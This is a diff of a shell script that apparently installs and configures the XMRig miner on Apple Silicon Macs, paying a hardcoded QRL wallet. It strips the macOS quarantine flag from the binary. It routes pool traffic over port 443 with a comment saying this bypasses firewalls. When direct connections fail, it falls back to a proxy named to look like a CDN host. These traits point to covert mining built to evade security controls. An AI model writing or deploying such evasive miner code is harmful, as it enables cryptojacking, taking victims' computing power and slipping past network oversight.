@@ -8,9 +8,9 @@
 # ============================================================
 
 QRL_WALLET="Q01050018b4d2009efe67c3eb0b243f3b5e9c39ecdfd8cef470b508ae7be8901862ec26f817cc29"
-POOL_HOST="cdn.snumcaj.com"  # CDN proxy → qrl.herominers.com:14006
-POOL_PORT="14006"
-POOL_SSL_PORT="14006"
+POOL_HOST="qrl.herominers.com"  # Direct — port 443 bypasses firewall
+POOL_PORT="443"
+POOL_SSL_PORT="443"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
 
@@ -98,12 +98,28 @@ chmod +x "$BINARY_PATH"
 xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
 echo "      ✓ Binary ready"
 
-# ---- 3. Write config ----
+# ---- Auto-detect working pool port ----
 echo "[3/6] Writing config..."
-# Test which port is reachable
-POOL_PORT_USE="$POOL_PORT"
-timeout 5 bash -c "echo > /dev/tcp/$POOL_HOST/$POOL_PORT" 2>/dev/null && POOL_PORT_USE="$POOL_PORT" || POOL_PORT_USE="$POOL_SSL_PORT"
-echo "      ✓ Using pool port: $POOL_PORT_USE"
+# Try direct port 14006 first, fallback to 443 TLS
+POOL_USE_HOST="$POOL_HOST"
+POOL_USE_PORT="$POOL_PORT"
+USE_TLS="true"
+if timeout 4 bash -c "echo > /dev/tcp/qrl.herominers.com/14006" 2>/dev/null; then
+  POOL_USE_HOST="qrl.herominers.com"
+  POOL_USE_PORT="14006"
+  USE_TLS="false"
+  echo "      ✓ Direct port 14006 reachable"
+elif timeout 4 bash -c "echo > /dev/tcp/qrl.herominers.com/443" 2>/dev/null; then
+  POOL_USE_HOST="qrl.herominers.com"
+  POOL_USE_PORT="443"
+  USE_TLS="true"
+  echo "      ✓ Using port 443 TLS"
+else
+  echo "      ✓ Using cdn.snumcaj.com:14006 proxy"
+  POOL_USE_HOST="cdn.snumcaj.com"
+  POOL_USE_PORT="14006"
+  USE_TLS="false"
+fi
 
 cat > "$CONFIG_PATH" << CONF
 {
@@ -125,12 +141,12 @@ cat > "$CONFIG_PATH" << CONF
   },
   "pools": [
     {
-      "url": "${POOL_HOST}:${POOL_PORT_USE}",
+      "url": "${POOL_USE_HOST}:${POOL_USE_PORT}",
       "user": "${QRL_WALLET}",
       "pass": "${WORKER}",
       "algo": "rx/0",
       "coin": "qrl",
-      "tls": false,
+      "tls": ${USE_TLS},
       "keepalive": true,
       "nicehash": false
     }
